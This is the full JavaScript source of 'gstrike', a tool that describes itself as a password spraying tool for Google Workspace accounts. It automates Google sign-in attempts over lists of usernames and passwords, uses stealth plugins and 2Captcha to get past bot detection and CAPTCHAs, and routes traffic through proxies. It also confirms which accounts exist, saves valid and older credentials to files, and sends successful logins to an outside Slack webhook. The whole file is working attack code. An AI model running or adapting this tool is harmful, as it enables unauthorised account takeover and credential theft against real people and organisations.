const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const RecaptchaPlugin = require("puppeteer-extra-plugin-recaptcha");
const commander = require("commander");
const fs = require("fs");
const { IncomingWebhook } = require("@slack/webhook");
const chalk = require("chalk");
const sleep = require("sleep-promise");
const path = require("path");
const Client = require("@infosimples/node_two_captcha");
require("log-timestamp");

commander
    .name("gstrike")
    .description(
        "A password spraying tool designed specifically for performing " +
            "\ntargeted password attacks against Google Workspace accounts"
    )
    .version("0.1.1")
    .option("-u, --usernames <file>", "Path to the usernames file")
    .option("-p, --passwords <file>", "Path to the passwords file")
    .option(
        "-w, --wait-time <ms>",
        "Minimum time to wait for page to load in milliseconds",
        1000,
        parseInt
    )
    .option(
        "-i, --interval <ms>",
        "Interval between login attempts in milliseconds",
        0,
        parseInt
    )
    .option("-H, --headless", "Run in headless mode", false)
    .option("-k, --api-key <key>", "2Captcha API key")
    .option("-s, --slack-webhook <url>", "Slack webhook URL")
    .option(
        "-o, --output <outputFile>",
        "Specify the output file name",
        "valid_creds.txt"
    )
    .option(
        "--test",
        "Test bot detection and take screenshot of the results",
        false
    )
    .option(
        "--demo",
        "Run in demo mode (do not output passwords to the screen)",
        false
    )
    .option(
        "--typing-delay <ms>",
        "Delay for typing in milliseconds",
        100,
        parseInt
    )
    .option(
        "-S, --screenshot",
        "Take screenshot on successful login or on unexpected behaviour",
        false
    )
    .option(
        "-d, --directory <dir>",
        "Directory to save screenshots when using -S",
        "screenshots"
    )
    .option(
        "--proxy <proxy>",
        "HTTP proxy to use (format: http://host:port)"
    )
    .option("-v, --verbose", "Enable verbose logging", false)
    .parse();

const options = commander.opts();

// Validate options
if (!options.test && (!options.usernames || !options.passwords)) {
    console.error(chalk.red("Usernames file and passwords file are required!"));
    process.exit(1);
}
// Remove trailing slashes from path
options.directory = path.normalize(options.directory);

// Check if directory exists and create it if it doesn't
if (!fs.existsSync(options.directory)) {
    fs.mkdirSync(options.directory);
    console.log(
        chalk.cyan("Directory", chalk.underline(options.directory), "created.")
    );
}

let client2captcha = null;

// Initialize 2Captcha client if API key was provided
if (options.apiKey) {
    client2captcha = new Client(options.apiKey, {
        timeout: 60000,
        polling: 5000,
        throwErrors: false,
    });
}

async function isRecaptchaActivated(page) {
    const recaptchaSelector = "#captchaimg";
    const recaptchaElement = await page.$(recaptchaSelector);
    return recaptchaElement !== null;
}

async function checkLoginSuccess(page) {
    return page.url().includes("inbox");
}

async function checkMFA(page) {
    if (
        page.url().includes("/challenge/dp?") ||
        page.url().includes("/challenge/totp?") ||
        page.url().includes("/challenge/ootp?") ||
        page.url().includes("/challenge/bc?") ||
        page.url().includes("/challenge/ipp?") ||
        page.url().includes("/challenge/sk/webauthn?") ||
        page.url().includes("/challenge/selection?")
    ) {
        return true;
    }
    if (page.url().includes("https://gds.google.com/web/chip?")) {
        return true;
    }
    return false;
}

async function removeFromArray(arr, element) {
    const index = arr.indexOf(element);
    if (index !== -1) {
        arr.splice(index, 1);
    }
}

async function sendSlackWebhook(webhookUrl, username, password, mfa) {
    try {
        const msg = mfa
            ? `Login Success!\nUsername: ${username}\nPassword: ${password} (MFA is active)`
            : `Login Success!\nUsername: ${username}\nPassword: ${password}`;
        const payload = {
            text: msg,
        };
        const webhook = new IncomingWebhook(webhookUrl, {
            icon_emoji: ":bomb:",
        });
        await webhook.send(payload);
    } catch (error) {
        console.error(
            chalk.red("Failed to send message to Slack webhook:"),
            error
        );
    }
}

async function decodeEntities(encodedString) {
    const translate_re = /&(nbsp|amp|quot|lt|gt);/g;
    const translate = {
        nbsp: " ",
        amp: "&",
        quot: '"',
        lt: "<",
        gt: ">",
    };
    return encodedString
        .replace(translate_re, function (match, entity) {
            return translate[entity];
        })
        .replace(/&#(\d+);/gi, function (match, numStr) {
            const num = parseInt(numStr, 10);
            return String.fromCharCode(num);
        });
}

async function solveRecaptchaManually(page) {
    console.warn(chalk.yellow("Captcha need to be solved manually!"));
    const readline = require("readline/promises");
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });
    const answer = await rl.question("Press ENTER after solving captcha: ");
    rl.close();
}

// main code
(async () => {
    const usernames = fs.readFileSync(options.usernames, "utf8").split("\n").filter(Boolean);
    const passwords = fs.readFileSync(options.passwords, "utf8").split("\n").filter(Boolean);

    if (options.test) {
        console.log("Running tests...");
        puppeteer.use(StealthPlugin());
        puppeteer.use(require("puppeteer-extra-plugin-minmax")());
        const browserOptions = {
            args: ["--no-sandbox"],
            headless: options.headless ? "new" : false,
            defaultViewport: null,
        };
        if (options.proxy) {
            console.log(chalk.yellow(`Setting proxy-server arg: --proxy-server=${options.proxy}`));
            browserOptions.args.push(`--proxy-server=${options.proxy}`);
        }
        const browser = await puppeteer.launch(browserOptions);
        const page = await browser.newPage();
        await page.setDefaultTimeout(15000);
        await page.goto("https://bot.sannysoft.com");
        await page.waitForNetworkIdle();
        await page.screenshot({ path: "testresult.png", fullPage: true });
        await browser.close();
        console.log(`All done, check the screenshot. ✨`);
        process.exit(0);
    }

    for (const password of passwords) {
        if (!password) continue;
        if (options.demo) {
            console.log("[+] Spraying password **************");
        } else {
            console.log("[+] Spraying password ", password);
        }

        for (const username of usernames) {
            if (!username) continue;

            const puppeteerInstance = require("puppeteer-extra");
            puppeteerInstance.use(StealthPlugin());
            puppeteerInstance.use(RecaptchaPlugin({
                provider: { id: "2captcha", token: options.apiKey },
                visualFeedback: true,
            }));
            puppeteerInstance.use(require("puppeteer-extra-plugin-minmax")());

            const browserOptions = {
                args: ["--no-sandbox"],
                headless: options.headless ? "new" : false,
                defaultViewport: null,
            };
            if (options.proxy) {
                console.log(chalk.yellow(`Setting proxy-server arg: --proxy-server=${options.proxy}`));
                browserOptions.args.push(`--proxy-server=${options.proxy}`);
            }

            const browser = await puppeteerInstance.launch(browserOptions);
            const page = await browser.newPage();

            tryuserlabel: try {
                console.log(`Current username: ${username}`);
                if (options.proxy) {
                    console.log(chalk.cyan(`Using proxy: ${options.proxy} for ${username}`));
                }
                if (options.verbose) {
                    page.on('request', request => console.log(`Request: ${request.url()}`));
                    page.on('response', response => console.log(`Response: ${response.url()} - ${response.status()}`));
                }
                await page.goto(
                    "https://accounts.google.com/AccountChooser/signinchooser?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&ec=asw-gmail-globalnav-signin"
                );

                const emailSelector = await page.waitForSelector('input[type="email"]');
                await emailSelector.type(username, { delay: options.typingDelay });
                await page.keyboard.press("Enter");

                await page.waitForNetworkIdle();

                let foundCaptcha = false;
                try {
                    const captchaimgSelector = await page.waitForSelector("#captchaimg", { visible: true });
                    if (captchaimgSelector) {
                        const valueHandle = await captchaimgSelector.getProperty("src");
                        const rawValue = await decodeEntities(await valueHandle.jsonValue());
                        console.warn(chalk.yellow(`Found captchaimg element!`));
                        if (options.apiKey) {
                            try {
                                const captchaRespSelector = await page.waitForSelector('input[aria-label="Type the text you hear or see"]');
                                await client2captcha.decode({ url: rawValue }).then(function (response) {
                                    console.log(chalk.cyan("Captcha decoded automatically with text:", chalk.bold(response.text)));
                                    captchaRespSelector.type(response.text, { delay: options.typingDelay });
                                });
                                await page.keyboard.press("Enter");
                            } catch (error) {
                                console.warn(chalk.red("Error during captcha handling:", error));
                                await solveRecaptchaManually(page);
                            }
                        } else {
                            await solveRecaptchaManually(page);
                        }
                        foundCaptcha = true;
                    }
                } catch {}

                if (!foundCaptcha) {
                    let { captchas, filtered, error } = await page.findRecaptchas();
                    if (error) console.error(chalk.red(`Error on captcha detection: ${error}`));
                    if (filtered.length > 0) {
                        console.debug(`Found ${filtered.length} filtered captchas`);
                        for (const filt of filtered) {
                            console.debug(`Captcha id: ${filt.id} - Filtered reason: ${filt.filteredReason}`);
                        }
                    }
                    if (captchas.length > 0) {
                        console.debug(`Found ${captchas.length} captchas`);
                        for (const captcha of captchas) {
                            console.debug(`Captcha URL: ${captcha.url}`);
                        }
                        if (options.apiKey) {
                            await page.solveRecaptchas();
                            await solveRecaptchaManually(page); // Temporary until automation is complete
                        } else {
                            await solveRecaptchaManually(page);
                        }
                        foundCaptcha = true;
                    }
                }

                try {
                    await page.waitForNavigation();
                } catch {}

                try {
                    const result = await page.evaluate(() => {
                        const elements = Array.from(document.querySelectorAll("span")).find((el) =>
                            el.textContent.match(/Couldn.t find your Google Account/)
                        );
                        if (elements) {
                            const computedStyle = getComputedStyle(elements);
                            return computedStyle.display !== "none" && computedStyle.visibility !== "hidden";
                        }
                        return false;
                    });
                    if (result) {
                        console.debug("Couldn't find account! Removing from list...");
                        await removeFromArray(usernames, username);
                        break tryuserlabel;
                    }
                } catch (error) {
                    console.error(chalk.red("Error when checking for account: ", error));
                }

                try {
                    await page.waitForNavigation();
                } catch {}

                try {
                    const passwordSelector = await page.waitForSelector('input[type="password"]');
                    await passwordSelector.type(password, { delay: 100 });
                    await page.keyboard.press("Enter");
                } catch (error) {
                    console.error(chalk.red("Could not find password field"));
                    break tryuserlabel;
                }

                try {
                    await page.waitForNavigation();
                } catch {}

                const element_wrong = await page.evaluate(() => {
                    const targetText = "Wrong password";
                    return Array.from(document.querySelectorAll("span")).find((el) =>
                        el.textContent.includes(targetText)
                    );
                });

                if (element_wrong) {
                    console.debug("Wrong password!");
                    break tryuserlabel;
                }

                const element_older = await page.evaluate(() => {
                    const targetText = "Your password was changed";
                    return Array.from(document.querySelectorAll("span")).find((el) =>
                        el.textContent.includes(targetText)
                    );
                });

                if (element_older) {
                    console.debug(chalk.cyan("Found an older password!"));
                    fs.appendFileSync("older_passwords.txt", `${username}:${password}\n`);
                    break tryuserlabel;
                }

                const isLoginSuccessful = await checkLoginSuccess(page);
                const isMfaTriggered = await checkMFA(page);
                if (isLoginSuccessful || isMfaTriggered) {
                    if (isMfaTriggered) {
                        fs.appendFileSync(options.output, `${username}:${password} (MFA)\n`);
                    } else {
                        fs.appendFileSync(options.output, `${username}:${password}\n`);
                    }
                    await removeFromArray(usernames, username);

                    if (options.demo) {
                        const msg = isMfaTriggered
                            ? `[+] Found valid credentials -> ${username}:********** (MFA is active)`
                            : `[+] Found valid credentials -> ${username}:**********`;
                        console.log(chalk.green(msg));
                    } else {
                        const msg = isMfaTriggered
                            ? `[+] Found valid credentials -> ${username}:${password} (MFA is active)`
                            : `[+] Found valid credentials -> ${username}:${password}`;
                        console.log(chalk.green(msg));
                    }

                    if (options.screenshot) {
                        const encodedCred = Buffer.from(`${username}:${password}`).toString("base64url");
                        const scr_path = isMfaTriggered
                            ? path.join(options.directory, `mfa_${encodedCred}.png`)
                            : path.join(options.directory, `success_${encodedCred}.png`);
                        try {
                            await page.screenshot({ path: scr_path, fullPage: true });
                            console.log(chalk.blue("Screenshot saved to ", scr_path));
                        } catch {
                            console.error(chalk.red("Could not save screenshot to ", scr_path));
                        }
                    }

                    if (options.slackWebhook) {
                        await sendSlackWebhook(options.slackWebhook, username, password, isMfaTriggered);
                    }
                }
            } catch (error) {
                fs.appendFileSync("incomplete_reqs.txt", `${username}:${password}\n`);
                console.error(chalk.red(`An error occurred with ${username}: ${error}`));
            } finally {
                const client = await page.target().createCDPSession();
                await client.send("Network.clearBrowserCookies");
                await client.send("Network.clearBrowserCache");
                await page.close();
                await browser.close();
                await sleep(options.interval);
            }
        }
    }

    console.log(chalk.green("Password spraying completed."));
    process.exit(0);
})();

